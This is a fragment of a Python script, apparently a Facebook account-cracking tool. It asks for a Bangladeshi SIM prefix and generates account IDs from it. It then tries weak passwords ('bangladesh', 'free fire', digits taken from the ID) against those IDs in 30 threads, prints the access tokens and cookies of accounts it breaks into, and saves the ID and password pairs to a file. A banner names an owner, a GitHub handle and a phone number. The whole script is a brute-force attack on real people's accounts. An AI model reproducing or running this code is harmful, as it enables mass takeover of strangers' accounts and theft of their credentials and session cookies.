...
def __banner___():
    os.system('clear')
    print(f"""\033[1;36m     BBB   IIIIII  IIIII SSSSSS IIIII HH   HAL
...
\033[1;37m    ┌───────────────────────────────────────┐
 \033[1;37m   │ [>] OWNER    : NAHID                 │
\033[1;37m    │ [>] GITHUB   : hackingboyjr             │
\033[1;37m    │ [>] WHATSAPP : +8801844921170        │
\033[1;37m    │ [>] VERSION  : 11                    │
\033[1;37m    │ [>] TYPE     : \033[1;32mRANDOM \033[1;37m                │
\033[1;37m    └───────────────────────────────────────┘""")
...
def ___mix___():
    ...
    os.system('clear')
    __banner___()
    print('\033[1;37m~[•] BD SIM CODE \033[1;37m017 015 018 019 013 015 016]')
    code = input('\033[1;36m~[+] SELECT : ')
#.     os.system('xdg-open https://github.com/x10-BISHAL')
    ...
    with ThreadPool(max_workers=30) as ___mal___:
     ...
     #   print('\033[1;92m┣━[•]\033[1;92m USER NAME \033[1;97m : '+jsn)
        ...
        for love in id:
           ...
           bu = ids[:8] #1st 8digit
           pwv = [love,au,bu,"@#@#@#","@@@###","bangladesh","free fire","bangla","Bangla"]
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m[BISHAL-OK] '+ids+' | '+pas+'\033[1;92m')
                print(f"\r\33[1;36m=[🥰]=COOKIES: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/BISHAL-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
